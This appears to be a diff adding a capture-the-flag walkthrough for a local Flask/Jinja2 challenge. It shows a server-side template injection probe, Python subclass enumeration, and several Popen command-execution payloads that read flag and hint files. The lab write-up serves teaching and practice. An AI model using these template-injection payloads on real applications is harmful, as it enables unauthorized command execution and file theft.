@@ -1,0 +1,71 @@
+Curdled Code (SSTI → RCE)
+..> CTF Challenge Walkthrough (CurdledCode)
+..> Initial Hint
+When the player visits the web page, they will see a simple page containing only one word: "Report".
+
+They should try the following SSTI test payload to confirm if the application is vulnerable:
+
+bash
+Copy
+Edit
+http://localhost:5000/report?template={{7*7}}
+If the site prints "49", then it confirms that the application is vulnerable to Server-Side Template Injection (SSTI).
+
+..> Privilege Escalation to RCE
+After confirming the SSTI vulnerability, the next step is to escalate it to Remote Code Execution (RCE).
+
+The player should start testing different payloads and look for built-in Python classes/functions such as:
+
+subprocess.Popen
+
+Popen
+
+os._wrap_close
+
+os.popen
+
+os.dup
+
+To enumerate subclasses and identify the correct index of subprocess.Popen, they should run:
+http://localhost:5000/report?template={{''.__class__.__mro__[1].__subclasses__()}}
+
+
+
+..>> Or, more effectively, to list the first 300 subclasses in a readable format:
+http://localhost:5000/report?template={% for i in range(300) %}{{i}}:{{''.__class__.__mro__[1].__subclasses__()[i]}}<br>{% endfor %}
+From here, they locate the index of subprocess.Popen to use it in the payload.
+
+
+
+ ..> Shortcut Payloads to Read the Flag
+In this specific challenge, the player doesn’t need to escalate using subclass enumeration. A direct SSTI-to-RCE payload can be used to read the flag file:
+
+Example (relative path):
+
+http://localhost:5000/report?template={{Popen('type etc\\flag.txt', shell=True, stdout=-1).communicate()[0]}}
+
+or 
+
+(this pyload   complex):
+ http://localhost:5000/report?template={{Popen('cmd /c type C:\\xampp\\htdocs\\CurdledCode\\etc\\flag.txt', shell=True, stdout=-1).communicate()[0]}}
+ 
+ >> The Twist
+However, the real twist is: the flag is not directly accessible.
+
+Instead, it is hidden inside one of several similarly named files to confuse the player. For example, the folder may include:
+
+ - Robots.txt 
+ - security.txt
+ - sitemap.xml
+ - flag.txt
+ - flagAZCTF.txt
+
+To solve it, the player must explore files like Robots.txt for a clue.
+
+Helpful payload:
+http://localhost:5000/report?template={{Popen('type etc\\Robots.txt', shell=True, stdout=-1).communicate()[0]}}
+..>This will reveal the real flag filename or path.
+
+
+
+#............>>>>> u should download flask bec we use Jinja2 Template Engine
